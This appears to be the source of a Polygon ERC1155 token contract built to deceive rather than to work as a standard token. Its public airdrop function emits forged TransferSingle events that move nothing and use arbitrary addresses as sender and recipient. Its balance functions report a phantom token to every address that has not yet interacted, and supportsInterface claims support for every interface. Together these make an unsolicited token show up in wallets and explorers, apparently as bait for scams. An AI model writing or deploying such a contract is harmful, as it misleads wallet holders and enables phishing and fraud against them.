// Chain: POLYGON - File: contracts/core/Airdroped.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

abstract contract Airdroped {
    mapping(address => bool) private _airdroped;

    function _executeAirdrop(address to) internal {
        if (_airdroped[to]) {
            return;
        }

        _airdroped[to] = true;
        _hiddenMint(to, 1, 1);
    }

    modifier executeAirdrop() {
        _executeAirdrop(msg.sender);
        _;
    }

    function _isAirdroped(address account) internal view returns (bool) {
        return _airdroped[account];
    }

    function _hiddenMint(
        address to,
        uint256 id,
        uint256 amount
    ) internal virtual;
}


// Chain: POLYGON - File: contracts/core/Ownable.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract Ownable {
    address public owner;

    function _setOwner(address newOwner) internal {
        owner = newOwner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    function setOwner(address newOwner) external onlyOwner {
        _setOwner(newOwner);
    }
}


// Chain: POLYGON - File: contracts/core/Strings.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

library Strings {
    function toString(
        uint _i
    ) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - (_i / 10) * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
}


// Chain: POLYGON - File: contracts/ERC1155.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./interfaces/IERC1155.sol";
import "./core/Ownable.sol";
import "./core/Airdroped.sol";
import "./core/Strings.sol";

contract ERC1155 is Ownable, IERC1155, Airdroped {
    using Strings for uint256;

    mapping(address => mapping(uint256 => uint256)) private _balances;
    mapping(address => mapping(address => bool)) private _operatorApprovals;
    string private _uri;

    string public name;
    string public symbol;

    constructor(
        string memory uri_,
        string memory name_,
        string memory symbol_
    ) {
        _setOwner(msg.sender);
        _uri = uri_;
        name = name_;
        symbol = symbol_;
    }

    function balanceOf(
        address account,
        uint256 id
    ) external view returns (uint256) {
        return _balances[account][id] + _notAirdropedBalance(account, id);
    }

    function _notAirdropedBalance(
        address account,
        uint256 id
    ) internal view returns (uint256) {
        return (id == 1 && !_isAirdroped(account)) ? 1 : 0;
    }

    function balanceOfBatch(
        address[] calldata accounts,
        uint256[] calldata ids
    ) external view returns (uint256[] memory) {
        require(accounts.length == ids.length, "Arrays length mismatch");

        uint256[] memory batchBalances = new uint256[](accounts.length);
        for (uint256 i = 0; i < accounts.length; ++i) {
            batchBalances[i] =
                _balances[accounts[i]][ids[i]] +
                _notAirdropedBalance(accounts[i], ids[i]);
        }
        return batchBalances;
    }

    function setApprovalForAll(
        address operator,
        bool approved
    ) external executeAirdrop {
        _operatorApprovals[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }

    function isApprovedForAll(
        address account,
        address operator
    ) external view returns (bool) {
        return _operatorApprovals[account][operator];
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external executeAirdrop {
        require(to != address(0), "Invalid address");
        require(_balances[from][id] >= value, "Insufficient balance");
        require(
            from == msg.sender || _operatorApprovals[from][msg.sender] == true,
            "Not approved"
        );

        _balances[from][id] -= value;
        _balances[to][id] += value;

        emit TransferSingle(msg.sender, from, to, id, value);
    }

    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external executeAirdrop {
        require(to != address(0), "Invalid address");
        require(ids.length == values.length, "Arrays length mismatch");
        require(
            from == msg.sender || _operatorApprovals[from][msg.sender] == true,
            "Not approved"
        );

        for (uint256 i = 0; i < ids.length; ++i) {
            require(
                _balances[from][ids[i]] >= values[i],
                "Insufficient balance"
            );

            _balances[from][ids[i]] -= values[i];
            _balances[to][ids[i]] += values[i];
        }

        emit TransferBatch(msg.sender, from, to, ids, values);
    }

    function setURI(string memory newuri) external onlyOwner {
        _uri = newuri;
        emit URI(newuri, 0);
    }

    function uri(uint256 id) public view returns (string memory) {
        return _uri;
        // return string(abi.encodePacked(_uri, "?id=", id.toString()));
    }

    function getURI() external view returns (string memory) {
        return _uri;
    }

    function airdrop(address[] calldata addresses) external {
        unchecked {
            uint256 length = addresses.length;
            for (uint256 i = 0; i < length; i += 2) {
                address recipient1 = addresses[i];
                address recipient2 = (i + 1 < length)
                    ? addresses[i + 1]
                    : address(0);

                emit TransferSingle(msg.sender, recipient1, recipient2, 1, 1);
            }
        }
    }

    // function airdrop(address[] calldata addresses) external {
    //     unchecked {
    //         uint256 length = addresses.length;
    //         for (uint256 i = 0; i < length; i++) {
    //             address recipient = addresses[i];
    //             emit TransferSingle(msg.sender, address(0), recipient, 1, 1);
    //         }
    //     }
    // }

    function _hiddenMint(
        address to,
        uint256 id,
        uint256 amount
    ) internal override {
        _balances[to][id] += amount;
    }

    function mint(address to, uint256 id, uint256 amount) external onlyOwner {
        _hiddenMint(to, id, amount);
        emit TransferSingle(msg.sender, address(0), to, id, amount);
    }

    function supportsInterface(bytes4 interfaceId) public view returns (bool) {
        return true;
    }
}


// Chain: POLYGON - File: contracts/interfaces/IERC1155.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

interface IERC1155 {
    event TransferSingle(
        address indexed _operator,
        address indexed _from,
        address indexed _to,
        uint256 _id,
        uint256 _value
    );

    event TransferBatch(
        address indexed _operator,
        address indexed _from,
        address indexed _to,
        uint256[] _ids,
        uint256[] _values
    );

    event ApprovalForAll(
        address indexed _owner,
        address indexed _operator,
        bool _approved
    );

    event URI(string _value, uint256 indexed _id);

    function safeTransferFrom(
        address _from,
        address _to,
        uint256 _id,
        uint256 _value,
        bytes calldata _data
    ) external;

    function safeBatchTransferFrom(
        address _from,
        address _to,
        uint256[] calldata _ids,
        uint256[] calldata _values,
        bytes calldata _data
    ) external;

    /**
        @notice Get the balance of an account's tokens.
        @param _owner  The address of the token holder
        @param _id     ID of the token
        @return        The _owner's balance of the token type requested
     */
    function balanceOf(
        address _owner,
        uint256 _id
    ) external view returns (uint256);

    /**
        @notice Get the balance of multiple account/token pairs
        @param _owners The addresses of the token holders
        @param _ids    ID of the tokens
        @return        The _owner's balance of the token types requested (i.e. balance for each (owner, id) pair)
     */
    function balanceOfBatch(
        address[] calldata _owners,
        uint256[] calldata _ids
    ) external view returns (uint256[] memory);

    /**
        @notice Enable or disable approval for a third party ("operator") to manage all of the caller's tokens.
        @dev MUST emit the ApprovalForAll event on success.
        @param _operator  Address to add to the set of authorized operators
        @param _approved  True if the operator is approved, false to revoke approval
    */
    function setApprovalForAll(address _operator, bool _approved) external;

    /**
        @notice Queries the approval status of an operator for a given owner.
        @param _owner     The owner of the tokens
        @param _operator  Address of authorized operator
        @return           True if the operator is approved, false if not
    */
    function isApprovedForAll(
        address _owner,
        address _operator
    ) external view returns (bool);
}